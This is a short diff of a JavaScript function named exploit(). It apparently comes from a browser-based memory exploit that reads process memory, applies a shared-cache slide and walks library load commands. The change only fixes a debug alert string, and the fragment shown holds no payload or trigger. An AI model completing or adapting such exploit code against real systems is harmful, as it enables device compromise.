@@ -719,7 +719,7 @@ function exploit(){
             var base = Add(memory.readInt64(Add(imgs, i * 0x20)), cache_slide);
             if(opcode_libs.some(lib => strcmp(fn, lib)))
             {
-               alert("here Mmm
+               alert("here")
                 var ncmds = memory.u32(Add(base, 0x10));
                 for(var j = 0, off = 0x20; j < ncmds; ++j)
                 {
